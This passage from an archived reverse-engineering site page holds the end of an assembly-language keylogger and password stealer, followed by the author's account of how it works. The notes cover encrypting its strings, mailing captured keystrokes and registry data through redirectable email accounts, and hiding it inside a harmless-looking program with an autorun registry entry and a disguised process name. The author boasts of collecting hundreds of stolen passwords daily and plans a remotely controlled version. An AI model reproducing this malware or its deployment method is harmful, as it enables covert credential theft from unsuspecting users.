+
+          shl     ecx,1
+
+          inc     ecx
+
+
+
+          mov     [Keymailbase],edi
+
+          mov     [Keymaillen],ecx
+
+
+
+          call    GetDefaultIP
+
+
+
+          mov     ecx,[rknum]
+
+          cmp     ecx,0
+
+          jz      @@ret
+
+          
+
+          mov     edi, [Keymailbase] 
+
+          mov     eax, [Keymaillen]
+
+          add     edi,eax
+
+          mov     [IPaddBase],edi
+
+
+
+          inc     ecx
+
+          shl     ecx,1
+
+          mov     [IPlen],ecx
+
+
+
+          shr     ecx,1
+
+          dec     ecx
+
+
+
+          mov     esi,offset rkbuff
+
+          
+
+  @@again1:
+
+
+
+          push    esi edi
+
+          mov     al,byte ptr[esi]
+
+          call    HexWrite8
+
+          pop     edi esi
+
+
+
+          inc     esi
+
+          inc     edi
+
+          inc     edi
+
+          loop    @@again1
+
+
+
+          mov     byte ptr[edi],0dh
+
+          inc     edi
+
+          mov     byte ptr[edi],0ah
+
+
+
+
+
+  @@ret:
+
+          
+
+          ret
+
+
+
+  SendMeData      Endp
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+
+
+  Decrypt         Proc    data_length:DWORD, start:DWORD
+
+
+
+          mov     ecx,data_length
+
+          xor     eax,eax
+
+          mov     esi,offset start
+
+
+
+  @@again:
+
+          mov     al,byte ptr[esi]
+
+          rol     al,1
+
+          dec     al
+
+          rol     al,1
+
+          mov     byte ptr[esi],al
+
+          inc     esi
+
+          loop    @@again
+
+
+
+          ret
+
+
+
+
+
+  Decrypt         Endp
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+
+
+  End Main         ;end of code, JUMP-spot (main)
+
+
+
+
+
+
+
+  Most of the code is self explainatory. But you may like to note the 
+
+  following details :
+
+
+
+  1- The data is encrypted so that any gizmo may not be able to see 
+
+     the text via HEX editor.
+
+
+
+  2- Two Redirectable E-mail accounts were made on internet (There are 
+
+     hundert of them freely available).
+
+
+
+  3- Both from and to addresses must be on different places, so that 
+
+     bounced back messages are not lost.
+
+
+
+  4- Main program tries to send the mail a number of times, if unsuccessful 
+
+     it tries an alternate SMTP server. If successful the program quits 
+
+     normally.
+
+
+
+  5- No Show window function is included in the main code.
+
+
+
+  6-Program opens a mapping file to communicate with the dll. A timer 
+
+    function is installed which monitors the first bytes of this mapping 
+
+    file, if these bytes are changed (i-e signal from dll that the keys 
+
+    are ready for sending) the program sends the trapped data along with 
+
+    some interesting registery keys.
+
+
+
+  Compilation results :
+
+
+
+  Both the dll and exe were compiled with TASM. The file size for each 
+
+  was 8k (Only). Actually the size is much smaller than 8K but I think 
+
+  that the minimum size of 8k is some how related with my HD cluster size.
+
+
+
+  Program Deployment:
+
+
+
+  These two files are so small that they can be included with any 
+
+  program (as resource data etc.). The front end of the program can be 
+
+  any thing (like a poem etc.). 
+
+
+
+  The front end program copies these files in the default windows directory 
+
+  and enters its name in the auto run key of registery. As the program name 
+
+  appears in the Ctrl-Alt-Del list, so it must be like some background process 
+
+  (osa.exe, rnaapp etc).
+
+
+
+  The total uncompressed size of my front end + these files was 24 K. (which 
+
+  reduced to 6K in zip file). Programs of this size can be eaisly sent via 
+
+  E-mail to your targets.
+
+
+
+  Results :
+
+
+
+  I wrote this program in june 1998 and it has been several months since 
+
+  it is in the open. I receive now HUNDRED of passwords daily (even powerful 
+
+  shell accounts of ISP themselves).
+
+
+
+  A typical result is given below :
+
+
+
+  414234564A410D52414E493432300D50
+
+  I
+
+  1C000000000000000000000000000000000000000000000000000000
+
+
+
+  Shahnawaz Gugher
+
+  Falcon computers
+
+  RemoteAccess\Profile\My Connection 4
+
+
+
+  Which gives the us the password in scan code form in the first line. 
+
+  A simple program can be written to decrypt it. 
+
+
+
+  Lessons to be Learnt :
+
+
+
+     1.Every Reverser must check the programs which he receives. 
+
+     2.As I have noted that my program takes only a fraction of a second 
+
+       to send the mail, so we must check every program from Micro$oft etc. 
+
+       for similar code. 
+
+
+
+  Further research :
+
+
+
+  As I currently have no control over the program, it sends mail every 
+
+  time the user connects. So in future versions i am thinking of a http 
+
+  based trapper.
+
+
+
+  - The program will trap the keys, then connect to a web address and 
+
+    receive further instructions about what to to do next.
+
+
+
+  The next important thing which i want to do is to make this program 
+
+  capable of trapping the passwords which are in pwl files or for the 
+
+  connection sechemes in which "Post dial terminal window" is not required.
+
+
+
+  Any one interested in the above projects is welcome to contact me 
+
+  at -mml-@iname.com
+
+
+
+MML</PRE>
+
+</PRE><CENTER><HR><I>You'r deep inside fravia's pages of reverse engineering, choose your way out</I>
+
+<HR size=2 width=33%>
+
+<A href="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm"><IMG SRC="noanon.gif" tppabs="http://www.anticrack.de/fravia/noanon.gif" ALT="Anonymity" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A><BR>
+
+<FONT color=gray>Fravia's Anonymity Academy</FONT>
+
+<HR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" 
+
+VSPACE="0"
+
+HSPACE="0" ALIGN="BOTTOM" width="13" height="13"><A HREF="index.html" tppabs="http://www.anticrack.de/fravia/index.html">homepage </A>
+
+<IMG 
+
+SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif"
+
+ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" width="13" height="13"><A 
+
+HREF="links.htm" tppabs="http://www.anticrack.de/fravia/links.htm">links </A><IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALT="red" ALIGN="BOTTOM" WIDTH="13" 
+
+HEIGHT="13"
+
+BORDER="0" VSPACE="0" HSPACE="0" NATURALSIZEFLAG="0"><A 
+
+HREF="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm">anonymity </A><IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" 
+
+HSPACE="0" width="13" height="13"><A
+
+HREF="orc.htm" tppabs="http://www.anticrack.de/fravia/orc.htm">+ORC </A><IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" 
+
+BORDER="0"
+
+VSPACE="0" HSPACE="0" width="13" height="13"><A HREF="tools.htm" tppabs="http://www.anticrack.de/fravia/tools.htm">tools </A><IMG 
+
+SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif"
+
+ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" width="13" height="13"><A 
+
+HREF="coumes.htm" tppabs="http://www.anticrack.de/fravia/coumes.htm">counter
+
+measures </A><BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" 
+
+HSPACE="0" width="13" height="13"><A
+
+HREF="student.htm" tppabs="http://www.anticrack.de/fravia/student.htm">students' essays </A><IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" 
+
+ALIGN="BOTTOM"
+
+BORDER="0" VSPACE="0" HSPACE="0" width="13" height="13"><A HREF="cocktail.htm" tppabs="http://www.anticrack.de/fravia/cocktail.htm">cocktails </A><IMG SRC=
+
+"bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" width="13" height="13"><A 
+
+HREF=
+
+"searengi.htm" tppabs="http://www.anticrack.de/fravia/searengi.htm">search_forms </A><IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" 
+
+BORDER=
+
+"0" VSPACE="0" HSPACE="0" width="13" height="13"><A HREF="ideale.htm" tppabs="http://www.anticrack.de/fravia/ideale.htm">antismut </A><IMG 
+
+SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif"
+
+ALIGN="BOTTOM" BORDER="0" VSPACE="0" HSPACE="0" width="13" height="13"><A 
+
+HREF="info.htm" tppabs="http://www.anticrack.de/fravia/info.htm">mail_fravia </A><BR>
+
+<IMG SRC="bulletr.gif" tppabs="http://www.anticrack.de/fravia/bulletr.gif" ALIGN="BOTTOM" BORDER="0" VSPACE="0" 
+
+HSPACE="0" width="13" height="13"><A HREF="legal.htm" tppabs="http://www.anticrack.de/fravia/legal.htm">Is reverse engineering legal? </A></CENTER></P>
+
+
+
+</BODY>
